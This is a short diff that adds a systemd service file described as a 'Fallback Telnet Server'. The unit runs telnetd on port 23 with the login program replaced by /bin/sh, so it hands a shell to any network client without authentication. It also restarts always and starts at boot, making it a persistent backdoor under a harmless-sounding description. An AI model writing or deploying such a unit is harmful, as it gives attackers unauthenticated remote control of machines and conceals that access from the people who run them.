@@ -1,0 +1,10 @@
+[Unit]
+Description=Fallback Telnet Server
+After=network.target
+
+[Service]
+ExecStart=/usr/sbin/telnetd -F -p 23 -l /bin/sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
